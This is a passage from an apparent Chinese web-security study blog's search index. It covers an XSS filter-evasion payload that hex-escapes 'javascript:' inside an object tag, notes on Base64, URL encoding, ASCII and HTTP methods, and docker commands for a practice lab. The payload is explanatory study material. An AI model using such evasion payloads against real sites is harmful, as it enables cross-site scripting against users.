<p>​			GET &#x2F;news&#x2F;society&#x2F;201210&#x2F;2358322923.shtml”</script><object 		data=jav\x61scr\x69pt:npsduc(uhg)> </p>
<p><strong>其中的\x61会被解码成a，\x69会被解码成i</strong> </p>
<h3 id="4、编码-Base64编码"><a href="#4、编码-Base64编码" class="headerlink" title="4、编码-Base64编码"></a>4、编码-Base64编码</h3><p>把每三个8Bit的字节转换为四个6Bit的字节，不能算加密，因为这种编码过程是可逆的</p>
<h3 id="5、URL编码"><a href="#5、URL编码" class="headerlink" title="5、URL编码"></a>5、URL编码</h3><p>URL编码就是找到你要编码的字符对应底层的16进制，然后再在前面加一个 百分号（%）。比如：a将编码成%61 。</p>
<h3 id="6、ACSLL码"><a href="#6、ACSLL码" class="headerlink" title="6、ACSLL码"></a>6、ACSLL码</h3><p>基于拉丁字母的一套电脑编码系统；</p>
<p>ASCII (American Standard Code for Information Interchange)：美国信息交换标准代码是基于<strong>拉丁字母</strong>的一套电脑<strong>编码</strong>系统，主要用于显示现代<strong>英语</strong>和其他<strong>西欧</strong>语言。它是最通用的<strong>信息交换标准</strong>，并等同于<strong>国际</strong>标准 ISO&#x2F;IEC 646。ASCII第一次以规范标准的类型发表是在1967年，最后一次更新则是在1986年，到目前为止共定义了128个字符 。</p>
<h2 id="Web应用基础"><a href="#Web应用基础" class="headerlink" title="Web应用基础"></a>Web应用基础</h2><p>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。</p>
<p>HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。</p>
<p>post方法中，请求头部是以一个空行为结束，即请求头部和body之间存在一个空白行。</p>
]]></content>
  </entry>
  <entry>
    <title>docker搭建靶场常用命令</title>
    <url>/2023/04/19/%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BAdocker%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h4 id="启动docker服务-："><a href="#启动docker服务-：" class="headerlink" title="启动docker服务 ："></a>启动docker服务 ：</h4><p> systemctl start docker</p>
<h4 id="重启docker服务："><a href="#重启docker服务：" class="headerlink" title="重启docker服务："></a>重启docker服务：</h4><p> systemctl restart  docker</p>
<h4 id="关闭docker服务："><a href="#关闭docker服务：" class="headerlink" title="关闭docker服务："></a>关闭docker服务：</h4><p>systemctl stop docker</p>
<h4 id="启动靶场："><a href="#启动靶场：" class="headerlink" title="启动靶场："></a>启动靶场：</h4><p>docker-compose build &amp;&amp; docker-compose up -d</p>
<h4 id="查看运行状态："><a href="#查看运行状态：" class="headerlink" title="查看运行状态："></a>查看运行状态：</h4><p>docker ps</p>
<h4 id="进入镜像："><a href="#进入镜像：" class="headerlink" title="进入镜像："></a>进入镜像：</h4><p>docker exec -it 4r8werw8e8er &#x2F;bin&#x2F;bash</p>
<p>docker exec -it 4r8werw8e8er bash</p>
<h4 id="退出镜像："><a href="#退出镜像：" class="headerlink" title="退出镜像："></a>退出镜像：</h4><p>exit</p>
<h4 id="关闭靶场镜像："><a href="#关闭靶场镜像：" class="headerlink" title="关闭靶场镜像："></a>关闭靶场镜像：</h4><p>docker-compose down</p>
<h4 id="关闭docker："><a href="#关闭docker：" class="headerlink" title="关闭docker："></a>关闭docker：</h4><p>systemctl stop docker</p>
<h4 id="docker-服务开机自启动命令："><a href="#docker-服务开机自启动命令：" class="headerlink" title="docker 服务开机自启动命令："></a>docker 服务开机自启动命令：</h4><p>systemctl enable docker.service</p>
<h4 id="关闭docker-服务开机自启动命令："><a href="#关闭docker-服务开机自启动命令：" class="headerlink" title="关闭docker 服务开机自启动命令："></a>关闭docker 服务开机自启动命令：</h4><p>systemctl disable docker.service</p>
]]></content>
  </entry>
</search>
